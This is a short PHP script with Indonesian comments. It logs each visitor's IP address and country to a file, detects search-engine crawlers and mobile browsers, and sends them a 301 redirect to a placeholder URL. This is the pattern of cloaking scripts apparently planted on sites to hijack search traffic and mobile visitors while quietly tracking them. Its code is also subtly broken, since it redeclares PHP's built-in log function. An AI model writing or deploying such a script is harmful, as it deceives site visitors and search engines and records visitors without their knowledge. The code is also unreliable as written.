<?php
//limit 45req permenit
function cariip($ip) {
    $apiURL = "http://ip-api.com/json/{$ip}";
    $response = file_get_contents($apiURL);
    $data = json_decode($response, true);
    if ($data && $data['status'] === 'success') {
        return $data['country'];
    }
    return 'Unknown';
}

function log() {

    $userIP = $_SERVER['REMOTE_ADDR'];
    $country = cariip($userIP);
    $visitTime = date("Y-m-d H:i:s");
    $logData = "IP: $userIP - Negara: $country - Waktu: $visitTime\n";
    file_put_contents("visitor_ips.log", $logData, FILE_APPEND);
}

log();

function ggbot() {
    $userAgent = strtolower($_SERVER['HTTP_USER_AGENT']);
    $bots = [
        'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider', 'yandexbot',
        'facebot', 'facebookexternalhit', 'ia_archiver', 'mj12bot', 'semrushbot',
        'rogerbot', 'ahrefsbot', 'spbot', 'pinterestbot', 'linkedinbot', 'telegrambot',
        'twitterbot', 'applebot'
    ];
    foreach ($bots as $bot) {
        if (strpos($userAgent, $bot) !== false) {
            return true;
        }
    }
    $botHeaders = ['x-forwarded-for', 'via', 'client-ip', 'x-real-ip'];
    foreach ($botHeaders as $header) {
        if (isset($_SERVER[$header])) {
            return true;
        }
    }

    return false;
}

function oppo() {
    $userAgent = strtolower($_SERVER['HTTP_USER_AGENT']);
    $mobileDevices = [
        'android', 'webos', 'iphone', 'ipad', 'ipod', 'blackberry', 'iemobile', 'opera mini',
        'mobile', 'nokia', 'samsung', 'htc', 'lg', 'motorola', 'sony', 'fennec', 'bolt', 'kindle',
        'silk', 'tablet', 'playbook', 'bb10', 'rim'
    ];
    foreach ($mobileDevices as $device) {
        if (strpos($userAgent, $device) !== false) {
            return true;
        }
    }
    if (isset($_SERVER['HTTP_X_WAP_PROFILE']) || isset($_SERVER['HTTP_PROFILE'])) {
        return true;
    }

    return false;
}

// ganti xxxxx url
if (ggbot() || oppo()) {
    header("Location: xxxxxx", true, 301);
    exit();
}

?>
